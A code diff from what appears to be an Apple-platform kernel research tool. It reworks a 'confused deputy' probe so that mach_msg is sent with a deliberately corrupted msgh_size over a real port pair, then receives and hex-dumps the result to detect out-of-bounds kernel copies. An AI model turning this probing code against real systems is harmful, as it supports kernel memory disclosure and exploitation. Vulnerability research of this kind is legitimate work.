@@ -1401,43 +1401,72 @@ cleanup:
                             (int)szAfter - (int)szBefore]);
 
                         // ---- CONFUSED DEPUTY: mach_msg with corrupted msgh_size ----
-                        // Kernel copies msgh_size bytes from userland. If msgh_size is
-                        // corrupted (e.g. 0x42=66 instead of 0x20=32), kernel reads OOB.
-                        // If we set it smaller, kernel copies less (safe). Test both.
-                        scopeNote(r, @"  --- confused deputy: mach_msg with corrupted size ---");
+                        // Use a real port pair so kernel actually copies the message.
+                        scopeNote(r, @"  --- confused deputy: mach_msg with real ports ---");
                         {
-                            uint8_t msgBuf[256];
-                            memset(msgBuf, 0x42, sizeof(msgBuf));
-                            // Build a minimal mach_msg header
-                            mach_msg_header_t *hdr = (mach_msg_header_t *)msgBuf;
-                            hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
-                            hdr->msgh_size = (mach_msg_size_t)szAfter;  // corrupted size
-                            hdr->msgh_remote_port = MACH_PORT_NULL;
-                            hdr->msgh_local_port = MACH_PORT_NULL;
-                            hdr->msgh_id = 0;
-
-                            scopeNote(r, [NSString stringWithFormat:
-                                @"  mach_msg: msgh_size=%u (was 0x20)", (unsigned)hdr->msgh_size]);
-                            // Try sending with corrupted size
-                            kern_return_t kr = mach_msg(hdr,
-                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
-                                hdr->msgh_size, 0,
-                                MACH_PORT_NULL, 0, MACH_PORT_NULL);
-                            scopeNote(r, [NSString stringWithFormat:
-                                @"  mach_msg send ret=%d (0=success, 4=MACH_SEND_INVALID_DEST)", (int)kr]);
-                            if (kr == MACH_MSG_SUCCESS || kr == MACH_SEND_INVALID_DEST) {
-                                scopeNote(r, @"  >>> CONFUSED DEPUTY: kernel processed corrupted msgh_size!");
+                            // Create a port pair for communication
+                            mach_port_t sendPort = MACH_PORT_NULL;
+                            mach_port_t recvPort = MACH_PORT_NULL;
+                            kern_return_t kr;
+                            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recvPort);
+                            if (kr != KERN_SUCCESS) {
+                                scopeNote(r, [NSString stringWithFormat:@"  port alloc failed: %d", (int)kr]);
                             } else {
-                                scopeNote(r, @"  kernel rejected message (expected with NULL ports)");
+                                kr = mach_port_insert_right(mach_task_self(), recvPort, recvPort, MACH_MSG_TYPE_MAKE_SEND);
+                                scopeNote(r, [NSString stringWithFormat:
+                                    @"  port pair: recv=%u send=%u (insert_right=%d)",
+                                    recvPort, recvPort, (int)kr]);
+
+                                // Build message with corrupted msgh_size
+                                uint8_t msgBuf[512];
+                                memset(msgBuf, 0x43, sizeof(msgBuf));  // fill pattern
+                                mach_msg_header_t *hdr = (mach_msg_header_t *)msgBuf;
+                                hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+                                hdr->msgh_size = (mach_msg_size_t)szAfter;  // CORRUPTED size
+                                hdr->msgh_remote_port = recvPort;
+                                hdr->msgh_local_port = MACH_PORT_NULL;
+                                hdr->msgh_id = 0x1337;
+
+                                scopeNote(r, [NSString stringWithFormat:
+                                    @"  sending: msgh_size=%u (should be 0x20), remote=%u, id=0x%x",
+                                    (unsigned)hdr->msgh_size, recvPort, hdr->msgh_id]);
+
+                                // Send with corrupted size — kernel copies msgh_size bytes
+                                kr = mach_msg(hdr,
+                                    MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                    hdr->msgh_size, 0,
+                                    MACH_PORT_NULL, 100, MACH_PORT_NULL);
+                                scopeNote(r, [NSString stringWithFormat:
+                                    @"  mach_msg send ret=%d", (int)kr]);
+                                if (kr == MACH_MSG_SUCCESS) {
+                                    scopeNote(r, @"  >>> CONFUSED DEPUTY: kernel accepted corrupted msgh_size with real port!");
+                                    // Try to receive the message to see what was copied
+                                    uint8_t recvBuf[512];
+                                    memset(recvBuf, 0, sizeof(recvBuf));
+                                    mach_msg_header_t *rhdr = (mach_msg_header_t *)recvBuf;
+                                    kr = mach_msg(rhdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                                        0, sizeof(recvBuf), recvPort, 100, MACH_PORT_NULL);
+                                    scopeNote(r, [NSString stringWithFormat:
+                                        @"  recv ret=%d  msgh_size=%u  msgh_id=0x%x",
+                                        (int)kr, (unsigned)rhdr->msgh_size, rhdr->msgh_id]);
+                                    if (kr == MACH_MSG_SUCCESS) {
+                                        // Dump first 32 bytes of received data
+                                        NSMutableString *hex = [NSMutableString string];
+                                        for (size_t j = 0; j < 32 && j < sizeof(recvBuf); j++)
+                                            [hex appendFormat:@"%02x ", recvBuf[j]];
+                                        scopeNote(r, [NSString stringWithFormat:@"  recv data: %@", hex]);
+                                        scopeNote(r, @"  >>> KERNEL COPIED DATA WITH CORRUPTED SIZE!");
+                                    }
+                                } else if (kr == MACH_SEND_INVALID_HEADER) {
+                                    scopeNote(r, @"  MACH_SEND_INVALID_HEADER — kernel validated size");
+                                } else {
+                                    scopeNote(r, [NSString stringWithFormat:
+                                        @"  kernel rejected: 0x%x", (int)kr]);
+                                }
+
+                                // Cleanup ports
+                                mach_port_destroy(mach_task_self(), recvPort);
                             }
-                            // Also try with a proper port (mach_task_self)
-                            hdr->msgh_size = (mach_msg_size_t)szAfter;
-                            kr = mach_msg(hdr,
-                                MACH_SEND_MSG | MACH_SEND_TIMEOUT,
-                                hdr->msgh_size, 0,
-                                mach_task_self(), 0, MACH_PORT_NULL);
-                            scopeNote(r, [NSString stringWithFormat:
-                                @"  mach_msg(self) ret=%d", (int)kr]);
                         }
                     }
                 }
